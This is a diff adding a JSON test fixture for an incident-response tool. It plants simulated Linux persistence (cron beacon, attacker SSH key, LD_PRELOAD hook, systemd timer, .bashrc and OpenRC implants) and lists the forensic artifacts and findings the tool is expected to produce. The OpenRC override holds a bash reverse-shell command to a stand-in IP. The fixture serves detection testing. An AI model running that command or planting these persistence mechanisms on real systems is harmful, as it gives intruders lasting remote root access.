@@ -1,0 +1,81 @@
+{
+  "name": "novice_persistence",
+  "incident_id": "IR-LAB-NOVICE",
+  "description": "The persistence a low-sophistication intrusion leaves on disk. Nothing here is hidden; the only question is whether the collection picks it up. Anything failing at this tier is a gap in the most basic case there is.",
+
+  "plant": [
+    {"id": "cron",        "type": "cron",        "path": "/etc/cron.d/ir-lab-beacon",
+     "line": "*/5 * * * * root /usr/local/bin/ir-lab-implant --beacon"},
+
+    {"id": "authkey",     "type": "authorized_key", "home": "/root",
+     "key": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILABPLANTEDKEYirlabplantedkeyirlab attacker@ir-lab"},
+
+    {"id": "suid",        "type": "suid",        "path": "/usr/local/bin/ir-lab-suid"},
+
+    {"id": "wwexec",      "type": "world_writable_exec", "path": "/usr/local/bin/ir-lab-ww"},
+
+    {"id": "preload",     "type": "ld_preload",  "path": "/usr/local/lib/ir-lab-hook.so"},
+
+    {"id": "timer",       "type": "systemd_timer", "name": "ir-lab-persist",
+     "content": "[Unit]\nDescription=ir-lab planted timer\n[Timer]\nOnBootSec=1min\nUnit=ir-lab-persist.service\n[Install]\nWantedBy=timers.target\n",
+     "service": "[Unit]\nDescription=ir-lab planted service\n[Service]\nExecStart=/usr/local/bin/ir-lab-implant\n"},
+
+    {"id": "shellinit",   "type": "file",        "path": "/root/.bashrc",
+     "content": "# ir-lab planted persistence\n/usr/local/bin/ir-lab-implant --persist &\n"},
+
+    {"id": "openrc",      "type": "openrc_service", "name": "ir-lab-rcpersist",
+     "script": "#!/sbin/openrc-run\ndescription=\"ir-lab planted service\"\ncommand=/tmp/ir-lab-implant\ncommand_background=true\n",
+     "conf": "command_args=\"-c 'bash -i >& /dev/tcp/203.0.113.77/4444 0>&1'\"\n"}
+  ],
+
+  "expect": [
+    {"id": "cron is collected",
+     "artifact": "forensics/cron_system.txt",   "contains": "ir-lab-beacon", "needs_plant": "cron"},
+
+    {"id": "ld.so.preload is collected",
+     "artifact": "forensics/ld_so_preload.txt", "contains": "ir-lab-hook.so", "needs_plant": "preload"},
+
+    {"id": "systemd unit files are collected",
+     "artifact": "forensics/systemd_unit_files.txt", "contains": "ir-lab-persist",
+     "needs_plant": "timer", "requires": "systemd"},
+
+    {"id": "OpenRC services are enumerated",
+     "artifact": "forensics/openrc_services.txt", "contains": "ir-lab-rcpersist",
+     "needs_plant": "openrc", "requires": "openrc"},
+
+    {"id": "init script bodies are collected, not just a directory listing",
+     "artifact": "forensics/init_scripts.txt", "contains": "/tmp/ir-lab-implant",
+     "needs_plant": "openrc", "requires": "openrc"},
+
+    {"id": "the conf.d override is collected",
+     "artifact": "forensics/init_scripts.txt", "contains": "203.0.113.77",
+     "needs_plant": "openrc", "requires": "openrc"},
+
+    {"id": "the conf.d payload is FLAGGED as init-script persistence",
+     "finding_contains": {"type": "Init Script Persistence", "contains": "ir-lab-rcpersist"},
+     "needs_plant": "openrc", "requires": "openrc"},
+
+    {"id": "the service's command= target is audited like a root systemd unit",
+     "finding_contains": {"type": "Privileged Task Binary Missing",
+                          "contains": "/tmp/ir-lab-implant"},
+     "needs_plant": "openrc", "requires": "openrc"},
+
+    {"id": "SUID binaries are collected",
+     "artifact": "suid_sgid_files.txt",         "contains": "ir-lab-suid", "needs_plant": "suid"},
+
+    {"id": "world-writable executables are collected",
+     "artifact": "world_writable_exec.txt",     "contains": "ir-lab-ww", "needs_plant": "wwexec"},
+
+    {"id": "authorized_keys are collected",
+     "artifact": "authorized_keys.txt",         "contains": "attacker@ir-lab", "needs_plant": "authkey"},
+
+    {"id": "shell init files are collected",
+     "artifact": "shell_init_files.txt",        "contains": "ir-lab-implant", "needs_plant": "shellinit"},
+
+    {"id": "every running binary is hashed",
+     "artifact": "running_binary_hashes.txt",   "contains": "/"},
+
+    {"id": "the process table is collected",
+     "artifact": "forensics/processes.txt",     "contains": "PID"}
+  ]
+}
